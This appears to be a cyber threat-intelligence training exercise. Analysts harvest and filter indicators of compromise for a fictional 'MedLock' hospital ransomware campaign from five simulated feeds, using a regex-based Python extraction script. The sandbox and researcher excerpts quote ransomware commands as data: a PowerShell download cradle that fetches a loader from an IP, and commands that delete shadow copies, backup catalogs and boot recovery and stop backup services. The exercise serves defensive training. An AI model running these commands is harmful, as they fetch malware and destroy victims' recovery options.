# Activity Overview

Time Allocation: 150 minutes

## Deliverable

- A fully configured "harvester" script that pulls from 5 simulated feeds (provided as text files below).
- A filtered output CSV file containing only relevant IoCs.
- A relevance audit log justifying each filtered item.

## Skills Practiced

OSINT feed harvesting, automated data extraction, IoC filtering, relevance assessment.

## Infographic Placeholder

> Insert infographic here: a three-stage process showing how raw threat data is converted into refined ransomware intelligence.

---

## File 1: Simulated OSINT Feed #1 - AlienVault OTX (Threat Pulse Feed)

```text
# FEED: AlienVault OTX - Threat Pulse
# SOURCE URL: https://otx.alienvault.com/api/v1/pulses/subscribed
# FORMAT: JSON-simulated CSV
# TIMESTAMP: 2026-04-28 10:00:00 UTC

pulse_id,name,created,indicators,indicator_type,tags,TLP
pulse_001,MedLock Ransomware Campaign,2026-04-28T08:15:00Z,5.188.88.99,IPv4,MedLock;Ransomware;Healthcare,amber
pulse_002,Healthcare Phishing Wave,2026-04-27T14:30:00Z,hr-updates-portal[.]com,domain,Phishing;Healthcare;MedLock,amber
pulse_003,MedLock C2 Infrastructure,2026-04-27T09:45:00Z,5.188.88.100,IPv4,MedLock;C2;Ransomware,amber
pulse_004,Ryuk Variant Detection,2026-04-26T22:10:00Z,med-patch-manager[.]net,domain,Ryuk;Ransomware;Evasion,green
pulse_005,MedLock Payload URL,2026-04-28T06:20:00Z,http://5.188.88.99/medlock_loader.bin,URL,MedLock;Loader;Malware,amber
pulse_006,Healthcare Sector Alert,2026-04-25T11:00:00Z,patient-billing-notice[.]com,domain,Phishing;Healthcare;MedLock,amber
pulse_007,MedLock SHA256 Hash,2026-04-28T04:00:00Z,8a7b6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6,file_hash,SHA256;MedLock;Loader,amber
```

## File 2: Simulated OSINT Feed #2 - Security Blog (BleepingComputer-style)

```text
# FEED: Security Blog - "CyberHealth News"
# SOURCE URL: https://cyberhealthnews.example.com/2026/04/medlock-ransomware-hits-third-hospital/
# ARTICLE TITLE: "MedLock Ransomware Hits Third Hospital in Two Weeks"
# PUBLISHED: 2026-04-28

A new ransomware variant called MedLock is aggressively targeting the healthcare
sector, with three hospitals confirmed infected since April 15, 2026.

The ransomware uses double extortion: encrypting patient records while exfiltrating
sensitive data to pressure victims into paying.

The following indicators have been confirmed by multiple security researchers:

DOMAINS:
- medlock-c2[.]biz (registered 2026-04-10, expires 2027-04-10)
- healthcare-update-portal[.]org (registered 2026-04-12)
- patient-portal-verify[.]net (registered 2026-04-15)

IP ADDRESSES:
- 5.188.88.99 (Russia, AS50340, known ransomware hosting)
- 5.188.88.100 (Russia, same ASN - backup C2)
- 185.165.29.45 (Netherlands, intermediary/proxy)

FILE HASHES (SHA256):
- 8a7b6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6 (MedLock loader)
- 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a (MedLock encryptor)

EMAIL ADDRESSES (phishing senders):
- billing@patient-portal-verify[.]net
- support@healthcare-update-portal[.]org

MITRE TAGS: T1566.001, T1486, T1490, T1041
TARGET SECTOR: Healthcare / Hospitals
RANSOM AMOUNT: 50-100 Bitcoin ($1.5M - $3M USD)
```

## File 3: Simulated OSINT Feed #3 - Social Media (Twitter/X - Researcher Posts)

```text
# FEED: Twitter/X Security Researcher Posts
# SOURCE URL: https://twitter.com/search?q=medlock%20ioc
# DATE RANGE: 2026-04-25 to 2026-04-28

@RansomwareTracker (2026-04-28 03:15 UTC):
"New MedLock samples spotted. C2 IPs: 5.188.88.99 and 5.188.88.100. Block immediately.
Hospitals in US and UK affected."
[LINKED IOCS: IPs 5.188.88.99, 5.188.88.100]

@MalwareHunter_42 (2026-04-27 22:30 UTC):
"MedLock ransom note filename: 'HOW_TO_RECOVER_FILES.txt'. Bitcoin wallet:
3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy (same as previous Ryuk campaigns)."
[LINKED IOCS: Bitcoin wallet, filename]

@HealthISAC_Alert (2026-04-27 16:45 UTC):
"ALERT: MedLock phishing domains observed targeting hospital HR departments:
- payroll-verification[.]com
- benefits-election[.]org
Both resolve to 5.188.88.99"
[LINKED IOCS: domains, IP]

@DFIR_Response (2026-04-26 12:00 UTC):
"MedLock uses vssadmin delete shadows to prevent recovery. Also kills backup services:
net stop VSS / net stop SQLWriter / net stop ArcServe"
[TTP information - no direct IoCs]

@ThreatIntel_Weekly (2026-04-25 08:30 UTC):
"MedLock indicators summary for past 7 days:
IPs: 5.188.88.99, 5.188.88.100, 185.165.29.45
Domains: medlock-c2.biz, health-portal-update.com
Hashes: 8a7b6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6"
[LINKED IOCS: IPs, domains, hash]
```

## File 4: Simulated OSINT Feed #4 - Public Sandbox (Triage/Any.Run-style)

```text
# FEED: Malware Sandbox Report - Triage
# SOURCE URL: https://triage.example.com/reports/2026-04-28-medlock
# ANALYSIS ID: medlock_8842a1b3-c4d5-4e6f-8a9b-0c1d2e3f4a5b
# STATUS: Completed
# MALWARE FAMILY: MedLock (Ransomware variant)

=== NETWORK TRAFFIC ===
Destination IPs (C2 communication):
- 5.188.88.99:443 (HTTPS, C2 beacon, 342 packets) - CONFIRMED MALICIOUS
- 5.188.88.100:443 (HTTPS, backup C2, 89 packets) - CONFIRMED MALICIOUS
- 185.165.29.45:80 (HTTP, GET /config.dat, 12 packets) - PROXY/C2

DNS Queries:
- medlock-c2.biz -> A 5.188.88.99
- healthcare-update-portal.org -> A 5.188.88.100
- ocsp.digicert.com -> 93.184.220.29 (FALSE POSITIVE - legitimate)
- update.microsoft.com -> 13.107.42.12 (FALSE POSITIVE - legitimate)

=== FILE SYSTEM ACTIVITY ===
Encrypted Files (extensions appended):
- .medlock (patient_records_april2026.xlsx -> .medlock)
- .medlock (surgery_schedule.pdf -> .medlock)

Created Files:
- C:\ProgramData\medlock.exe (SHA256: 8a7b6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6)
- C:\Users\Public\HOW_TO_RECOVER_FILES.txt (ransom note)

=== PROCESS TREE ===
- outlook.exe -> opened phishing attachment
- wscript.exe (JScript) -> executed medlock_loader.js
- powershell.exe -> DownloadString('http://5.188.88.99/medlock_loader.bin')
- medlock.exe -> executed ransomware

=== COMMANDS EXECUTED ===
- vssadmin delete shadows /all /quiet
- wbadmin delete catalog -quiet
- bcdedit /set {default} recoveryenabled No

=== YARA RULES MATCHED ===
- rule MedLock_Ransomware (score: 98)
- rule Ransomware_Delete_Shadows (score: 95)
- rule Healthcare_Targeting (score: 92)
```

## File 5: Simulated OSINT Feed #5 - RSS Security Aggregator (Multi-Source)

```text
# FEED: RSS Security Aggregator - "ThreatFeed"
# SOURCE URL: https://threatfeed.example.com/combined/rss
# LAST FETCH: 2026-04-28 09:00:00 UTC

=== ITEM 1 (from The DFIR Report RSS) ===
Title: "MedLock Ransomware: Deep Dive into Healthcare Campaign"
Date: 2026-04-27
IoC mentions:
- Domains: medlock-c2.biz, healthcare-update-portal.org, patient-billing-notice.com
- IPs: 5.188.88.99, 5.188.88.100, 185.165.29.45
- Hashes: 8a7b6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6
- Note: "All indicators confirmed across multiple hospitals"

=== ITEM 2 (from CISA Alerts RSS) ===
Title: "AA26-118A: MedLock Ransomware Targeting Healthcare"
Date: 2026-04-26
IoC mentions:
- IPs: 5.188.88.99, 185.165.29.50 (NEW - previously unreported)
- Domains: med-portal-security.com, hospital-billing-update.org
- Bitcoin wallet: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
- TTPs: vssadmin deletion, PowerShell download cradles, phishing with .js attachments

=== ITEM 3 (from SANS ISC Diary) ===
Title: "Diary: MedLock Infections Increasing in Midwest Hospitals"
Date: 2026-04-25
IoC mentions:
- Phishing domains: hr-services-portal.net, employee-verification-system.com
- IP: 5.188.88.99 (consistent across all reports)
- Note: "Possible false positive: teams.microsoft.com - legitimate unless redirected"

=== ITEM 4 (from SecurityWeek RSS) ===
Title: "MedLock Ransomware Demands $2.5M from Hospital Systems"
Date: 2026-04-24
IoC mentions:
- Bitcoin wallets: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy (primary)
- 1A2b3C4d5E6f7G8h9I0jK1l2M3n4O5p (secondary - new)
- Domains: medlock-backup-c2.net, healthcare-data-encrypted.org
```

## File 6: Relevance Filtering Rules (Healthcare Sector Focus)

```text
INTELLIGENCE REQUIREMENTS (Filtering Rules)
Target Sector: Healthcare / Hospitals
Geographic Focus: Global, prioritize IoCs associated with healthcare targeting
Time Window: Only IoCs first observed in the last 7 days (from 2026-04-21 to 2026-04-28)
IoC Types Required: IP addresses, Domains, URLs, and File Hashes (SHA256) - ALL types
Threat Family: MedLock (primary), any healthcare-targeting ransomware (secondary)
Exclude: Generic phishing (unless healthcare-related), false positives (e.g., ocsp.digicert.com)
Include Bitcoin wallets only if explicitly tied to MedLock campaign
```

## File 7: Harvester Script Logic (Manual Execution Instructions)

```python
# HARVESTER SCRIPT LOGIC - MedLock OSINT Feed Aggregator
# You will manually apply these rules

import re
from datetime import datetime, timedelta

# Configuration
CUTOFF_DATE = datetime(2026, 4, 21)  # Only IoCs from last 7 days
REQUIRED_IOC_TYPES = ['ip', 'domain', 'url', 'hash']  # Include all types
TARGET_FAMILIES = ['MedLock', 'Ransomware', 'Healthcare']
EXCLUDED_DOMAINS = ['ocsp.digicert.com', 'update.microsoft.com', 'teams.microsoft.com']

# Function to extract IP addresses from text
def extract_ips(text):
    ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
    # Exclude common false positives (8.8.8.8, 1.1.1.1, etc.)
    return [ip for ip in re.findall(ip_pattern, text)
            if not ip.startswith('8.8.') and not ip.startswith('1.1.')]

# Function to extract domains from text
def extract_domains(text):
    domain_pattern = r'\b[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}\b'
    domains = re.findall(domain_pattern, text)
    # Exclude known legitimate domains
    return [d for d in domains if d not in EXCLUDED_DOMAINS]

# Function to extract SHA256 hashes
def extract_sha256(text):
    sha256_pattern = r'\b[a-fA-F0-9]{64}\b'
    return re.findall(sha256_pattern, text)

# Function to extract Bitcoin wallets
def extract_bitcoin(text):
    btc_pattern = r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
    return re.findall(btc_pattern, text)

# Check relevance based on family keywords
def is_relevant(family_text):
    keywords = TARGET_FAMILIES + ['hospital', 'healthcare', 'patient', 'medlock']
    for keyword in keywords:
        if keyword.lower() in family_text.lower():
            return True
    return False
```

## File 8: Filtered Output CSV Template - MedLock

### FILTERED IoCs - RELEVANT ONLY (MEDLOCK RANSOMWARE)

Target Sector: Healthcare / Hospitals  
Date Range: 2026-04-21 to 2026-04-28  
IoC Types: IP, Domain, URL, Hash, Bitcoin Wallet

| IoC Value | Type | Source Feed | Threat Family | Date Observed | Keep/Exclude | Exclusion Reason (if excluded) |
| --- | --- | --- | --- | --- | --- | --- |
| [IoC] | [Type] | [Feed name] | [Family] | [Date] | [Keep/Exclude] | [If exclude, why] |

### RELEVANT IoCs (KEPT) - Summary List

[Write each kept IoC on a new line, organized by type]

### EXCLUDED IoCs (FILTERED OUT) - Summary List

[Write each excluded IoC with reason]
